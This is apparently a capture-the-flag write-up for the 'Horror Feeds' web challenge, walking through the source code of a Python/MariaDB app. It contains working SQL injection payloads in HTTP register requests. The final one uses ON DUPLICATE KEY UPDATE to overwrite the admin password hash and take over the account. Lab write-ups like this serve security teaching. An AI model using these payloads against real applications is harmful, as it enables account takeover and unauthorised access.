## Challenge Description
An unknown entity has taken over every screen worldwide and is broadcasting this haunted feed that introduces paranormal activity to random internet-accessible CCTV devices. Could you take down this streaming service?

We have the source code of a Python application.

In the `entrypoint.sh` file, we see that the application creates a `MySQL/MariaDB` database and populates the following data.

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/HacktheBoo-ctf-2022/Horror-Feeds/web_horror_feeds]
└─$ cat entrypoint.sh       
#!/bin/bash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Initialize & Start MariaDB
mkdir -p /run/mysqld
chown -R mysql:mysql /run/mysqld
mysql_install_db --user=mysql --ldata=/var/lib/mysql
mysqld --user=mysql --console --skip-networking=0 &

# Wait for mysql to start
while ! mysqladmin ping -h'localhost' --silent; do echo 'not up' && sleep .2; done

mysql -u root << EOF
CREATE DATABASE horror_feeds;

CREATE TABLE horror_feeds.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);

INSERT INTO horror_feeds.users (username, password) VALUES ('admin', '$2a$12$BHVtAvXDP1xgjkGEoeqRTu2y4mycnpd6If0j/WbP0PCjwW4CKdq6G');

CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
GRANT SELECT, INSERT, UPDATE ON horror_feeds.users TO 'user'@'localhost';

FLUSH PRIVILEGES;
EOF

/usr/bin/supervisord -c /etc/supervisord.conf  
```

If you look at line `INSERT INTO horror_feeds.users...`, it hardcodes the `admin` user password hash but I'm sure we won't be able to crack it. The challenge is not going to be that easy I guess.

Let's dive into the source code.

In `routes.py` file, we see that when a user is authenticated, the application renders `dashboard.html` template and passes the flag to the template.

![hf-2](https://user-images.githubusercontent.com/87711310/211261834-74448e65-a5f6-4adc-9fab-7bbf640e2627.png)

However, the flag gets printed on the dashboard only when the authenticated user is admin, as shown in the following screenshot.

![hf-3](https://user-images.githubusercontent.com/87711310/211261836-4ff04f39-af49-4da2-bc31-370404f46b3e.png)

So now, we need to authenticate as `admin`. I have checked the authentication logic and it seems to be fine. We also have a user `registration` feature. May be we can trick the application to register another `admin` user?

Let's take a look at the code.

So the `/register` route calls the `register` function from `database.py`.

![hf-4](https://user-images.githubusercontent.com/87711310/211262434-97abc661-eebf-4868-8429-0c1e69bb569d.png)

In the `register` function, we see that there's an `SQL injection` on line 37 in `INSERT` SQL query.

![hf-5](https://user-images.githubusercontent.com/87711310/211262437-6632d973-0a8f-4a62-ae67-754d937ac02f.png)


Well, this `SQL injection` is not going to support `stacked queries` so we cannot do `UPDATE` query to `update the password` of the existing `admin` user. We can only modify the current `INSERT` statement. Maybe we can insert `another user with username admin`? Would that be helpful? Let's take a look.

But wait, that won't work either because the `username` column has the `UNIQUE` constraint set. This can be verified in `entrypoint.sh`.

![hf-6](https://user-images.githubusercontent.com/87711310/211264350-f543a701-25fa-4801-9b9f-dfd85b75f4da.png)

The `UNIQUE` constraint on a MySQL column means that two rows cannot have the same value for this column. MySQL throws an exception in that case. We can give this a try. Let's spawn the target instance and view the application in the browser.

![hf-0](https://user-images.githubusercontent.com/87711310/211264449-97f2303d-c782-4fdc-aa2c-5a793ab383a0.png)

Since none the SQL Injection techniques worked, I just registered with a simple username & password: `test:test` to check what happens.

Registering the new user and logging in, on the home page it shows spooky CCTV footage as told in the challenge description. There’s nothing more.

![hf-1](https://user-images.githubusercontent.com/87711310/211264442-2183f211-7c5f-4761-b242-ba5348463b65.png)

The is what the `register` API request looks like.


```
POST /api/register HTTP/1.1
Host: 178.62.79.95:31900
Content-Length: 221
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://178.62.79.95:31900
Referer: http://178.62.79.95:31900/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
 
{"username":"test","password":"test"}
```

If we try to create a user with username admin, we get the following error.

![hf-9](https://user-images.githubusercontent.com/87711310/211267438-3d1d851c-ffa1-4094-bcc4-0aae8d201096.png)

However, note that this is not the exception by MySQL I was referring to earlier. This error is returned because of the lines `32, 33` in the `register` function.

![hf-10](https://user-images.githubusercontent.com/87711310/211269408-459f89b4-17d1-4d15-9c42-90265557f13b.png)

Before the `INSERT` query, the application checks if the `username` already exists in the `users` table using a `SELECT` query. This `SELECT` query is not vulnerable to SQL injection. We can bypass this check by not creating the user this way. We can instead exploit the SQL injection to create another user with username `admin`. It would at least bypass this check.

Let's give it a try. I'll create a bcrypt hash of a known string because that's what we need to store in the database in the `password` column. So `$2a$12$q.YMW3ajoRGnS3qvpCePCOp12mpZsyKU2UnWaHq.LZjYcoL4wCx0.` is the bcrypt hash of `test`. I'll use this as a password.


Here's the payload.

```
POST /api/register HTTP/1.1
Host: 206.189.117.93:32296
Content-Length: 105
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.117.93:32296
Referer: http://206.189.117.93:32296/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
 
{
    "username": "admin\", '$2a$12$q.YMW3ajoRGnS3qvpCePCOp12mpZsyKU2UnWaHq.LZjYcoL4wCx0.')#",
    "password": "test"
}
```

Now, we get the MySQL exception because of the UNIQUE constraint.

![hf-11](https://user-images.githubusercontent.com/87711310/211269416-700ae10f-3ede-450c-9537-2dff4f35f55e.png)

After googling for a while, I found out a trick that we can use here.

In `MySQL/MariaDB`, we can perform the INSERT query in a way that if there's already a duplicate UNIQUE column, we can perform an UPDATE query on the already existing row which has the duplicate value, and it doesn't even require the stacked queries. It would require the use of ON DUPLICATE KEY UPDATE clause. This is what it looks like.

You can find the detailed document [here](https://mariadb.com/kb/en/insert-on-duplicate-key-update/)


```
INSERT INTO users (username, password) VALUES ('admin', 'password-hash') ON DUPLICATE KEY UPDATE username='admin',password='some-known-password-hash';
```

Here's what the payload looks like in this case:
```
POST /api/register HTTP/1.1
Host: 206.189.117.93:32296
Content-Length: 105
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.117.93:32296
Referer: http://206.189.117.93:32296/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
 
{
    "username": "admin\", '$2a$12$q.YMW3ajoRGnS3qvpCePCOp12mpZsyKU2UnWaHq.LZjYcoL4wCx0.') ON DUPLICATE KEY UPDATE username='admin',password='$2a$12$q.YMW3ajoRGnS3qvpCePCOp12mpZsyKU2UnWaHq.LZjYcoL4wCx0.'#",
    "password": "test"
}
```

Seems like it worked.

![hf-12](https://user-images.githubusercontent.com/87711310/211273728-9120de24-2e60-46a8-bf15-3d63c02313d2.png)

Let's login with username `admin` and password `test`.

And..... we have the flag.

![hf-13](https://user-images.githubusercontent.com/87711310/211274438-eb46c08d-3ec1-430d-940a-3421d7dcbc74.png)
